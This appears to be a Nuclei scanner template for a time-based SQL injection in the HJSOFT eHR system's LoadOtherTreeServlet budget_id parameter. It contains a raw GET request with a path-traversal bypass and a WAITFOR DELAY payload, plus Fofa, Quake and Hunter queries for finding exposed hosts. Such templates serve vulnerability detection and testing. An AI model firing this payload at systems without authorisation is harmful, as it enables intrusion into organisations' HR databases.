id: HJSOFT-HCM_LoadOtherTreeServlet_SQLi

info:
  name: HJSOFT-HCM_LoadOtherTreeServlet_SQLi
  author: HK
  severity: high
  description: 宏景eHR人力资源管理系统(ERP) LoadOtherTreeServlet接口budget_id参数存在SQL注入漏洞。
  metadata:
    max-request: 1
    Fofa-query: body="/ThirdResource/respond/respond.min.js"
    Quaker-query: body="/ThirdResource/respond/respond.min.js"
    Hunter-query: body="/ThirdResource/respond/respond.min.js"
    verified: true

http:
- raw:
  - |+
    @timeout: 30s
    GET /w_selfservice/oauthservlet/%2e./.%2e/gz/LoadOtherTreeServlet?modelflag=4&budget_id=1%29%3BWAITFOR+DELAY+%270%3A0%3A4%27--&flag=1 HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate, br
    Connection: close

  redirects: true
  matchers-condition: and
  matchers:
    - type: dsl
      dsl:
        - 'duration >= 4'